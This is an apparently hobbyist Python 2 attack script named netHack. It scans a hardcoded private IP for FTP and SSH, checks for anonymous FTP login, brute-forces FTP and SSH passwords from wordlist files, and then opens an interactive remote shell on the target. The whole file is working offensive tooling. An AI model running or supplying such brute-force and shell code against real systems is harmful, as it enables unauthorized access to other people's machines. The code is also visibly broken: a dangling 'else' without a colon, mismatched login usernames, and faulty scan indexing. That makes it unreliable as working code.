import nmap, pexpect, ftplib
from pexpect import pxssh
import time, os

class netHack(object):
	def __init__(self, target_host, username):
		self.ports = [21, 22] #port 21=ftp, port 22=ssh
		self.target_host = target_host
		self.username = username #ftp username
		self.carryExploit1 = False #return true if ftp is open
		self.ftpBruteForce = None # if bruteforcing is required
		self.carryExploit2 = False #return True if ssh is open 
		self.sshBruteForce = None # if user wants a shell
		self.PROMPT = ['#', '>', '>>', '\$']
		self.scanResults = [] # we will append to this whether ports are open or closed
		self.run = self.netScan()


	def netScan(self):
		for p in self.ports:
			nmScanner = nmap.PortScanner()
			nmScanner.scan(self.target_host, str(p))
			state = nmScanner[self.target_host]['tcp'][p]['state']
			self.scanResults.append(str(state))
			if self.scanResults[0] == 'open':
				print '[+] FTP port: 21/%s' % state.upper()
				time.sleep(1)
				self.carryExploit1 = True
			else: 
				print 'port %d/%s' % (p, state.upper())
				continue
			if self.scanResults[1] == 'open':
				print '[+] SSH port: 22/%s' % state.upper()
				self.carryExploit2 = True
				time.sleep(1)
			else: 
				print 'port %d/%s' % (p, state.upper())
				

		if self.scanResults[0] == 'closed' and self.scanResults[1] == 'closed':
			print 'Both ports are closed. Try another ip address/hostname.'
			exit(0)

		else
	def netExploit(self):
		usrIpt = str(raw_input('would you like to proceed to exploit stage? (Y/N): '))
		if usrIpt == 'y' or usrIpt == 'Y':
			if self.carryExploit1 is True:
				print 'checking for anonymous login on FTP server!'
				time.sleep(1)
				try:
					ftp = ftplib.FTP(self.target_host)
					ftp.login('anonymous', 'me@something.com')
					print 'anonymous login Vulnerability: available.'
					usrIpt = raw_input('would you like to connect into ftp? (Y/N): ')
					if usrIpt == 'y' or usrIpt == 'Y':
						self.ftpShell(self.target_host, 'anonymous', 'me@something.com')
				except:
					print 'anonymous login unavailable.'
					usrIpt = str(raw_input('would you like to attempt a Bruteforce' \
														 		' attack? (Y/N): '))
					if usrIpt == 'Y' or usrIpt == 'y':
						self.netFtp_Bruteforce()
					else:
						pass
			else:
				pass

			if self.carryExploit2 is True:
				print 'Bruteforce SSH server for SSH access'
				self.sshBruteForce = raw_input('enter a password file: ')
				if os.path.isfile(self.sshBruteForce):
					with open(self.sshBruteForce, 'r') as f:
						for line in f.readlines():
							pw = line.strip('\r\n')
							try:
								s = pxssh.pxssh()
								s.login(self.target_host, 'a', pw)
								print '[+] password found:', pw
								usrIpt = raw_input('would you like to connect' \
								 					' to the server? (Y/N):  ')
								if usrIpt == 'y' or usrIpt == 'Y':
									self.sshShell(self.target_host, self.username, pw)
								else:
									print 'exiting program.'
							except: pass
				else: print 'password file does not exist.'
		else: print 'quiting program.'
	#test netFtp_
	def netFtp_Bruteforce(self):
		self.ftpBruteForce = str(raw_input('enter a user|password file: '))
		if os.path.isfile(self.ftpBruteForce):
			with open(self.ftpBruteForce, 'r') as f:
				for line in f.readlines():
					user = line.split(':')[0]
					password = line.split(':')[1]
					try:
						ftp = ftplib.FTP(self.target_host)
						ftp.login(user, password)
						print '[+] password for ftp found:', password
						usrIpt = raw_input('would you like to connect into ftp? (Y/N): ')
						if usrIpt == 'y' or usrIpt == 'Y':
							self.ftpShell(self.target_host, user, password)
							break
					except: pass
		else: print 'password file does not exist.'

	def ftpShell(self, host, username, password):
		child = pexpect.spawn('ftp', [str(host)])
		child.expect([': '])
		child.sendline(username)
		child.expect([pexpect.TIMEOUT, 'passowrd: ', 'Password: '])
		child.sendline(password)
		child.expect('ftp> ')
		while True:
			usrIpt = raw_input('> ')
			child.sendline(usrIpt)
			child.expect('ftp> ')
			print child.before

	def sshShell(self, hostname, user, passwd):
		child = pexpect.spawn('ssh', [str(user) + '@' + str(hostname)])
		child.expect([pexpect.TIMEOUT, 'passowrd: ', 'Password: '])
		child.sendline(passwd)
		child.expect(self.PROMPT)
		while True:
			usrIpt = raw_input('> ')
			child.sendline(usrIpt)
			child.expect(self.PROMPT)
			print child.before
			

test = netHack('192.168.0.32', 'a')
test.netExploit()
